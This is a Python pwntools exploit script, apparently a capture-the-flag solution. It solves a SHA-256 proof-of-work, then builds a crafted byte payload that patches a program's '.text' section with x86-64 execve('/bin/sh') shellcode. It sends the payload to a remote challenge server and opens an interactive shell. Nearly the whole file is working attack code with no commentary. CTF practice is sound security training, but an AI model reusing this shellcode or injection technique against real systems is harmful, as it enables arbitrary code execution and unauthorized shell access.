from pwn import *

def dopow(c):
    from hashlib import sha256
    chal = c.recvline()
    post = chal[12:28]
    tar = chal[33:-1].decode('latin-1')
    c.recvuntil(':')
    found = iters.bruteforce(lambda x:sha256(x.encode('latin-1')+post).hexdigest()==tar, string.ascii_letters+string.digits, 4)
    c.sendline(found)


context.log_level='debug'

dat = b''
dat += bytes([28, 3, 0])
dat += bytes([29, 16, 2, 3])
dat += bytes([27, 3, 0])
dat += bytes([26, 2, 3])
dat += bytes([12, 3, 0])+b".text\x00"
dat += bytes([6, 4, 3])
dat += bytes([15, 5, 2])+b".text\x00"+bytes([4])
dat += bytes([2, 4, 3])
dat += bytes([17, 16, 5, 4])
dat += bytes([23, 6, 2])
dat += bytes([22, 6, 5, 2, 0])+b"main\x00"
dat += bytes([21, 16, 2, 6])
dat += bytes([23, 7, 2])
dat += bytes([22, 7, 5, 2, 0])+b"j;X\x99RH\xbb/";
dat += bytes([32, 8, 7])
dat += bytes([18, 16, 2, 5, 8, 0, 8])
dat += bytes([22, 7, 5, 2, 0])+b"/bin/shS"
dat += bytes([32, 8, 7])
dat += bytes([18, 16, 2, 5, 8, 8, 8])
dat += bytes([22, 7, 5, 2, 0])+b"T_RWT^\x0f\x05"
dat += bytes([32, 8, 7])
dat += bytes([18, 16, 2, 5, 8, 16, 8])
dat += bytes([0])


'''
with open('dat', 'wb') as f:
    f.write(dat)
'''
#c = remote('127.0.0.1', 10001)
c = remote('instance.penguin.0ops.sjtu.cn', 18432)
dopow(c)
c.recvline()
c.sendline(str(len(dat)).encode())
c.sendline(dat.hex())

c.interactive()
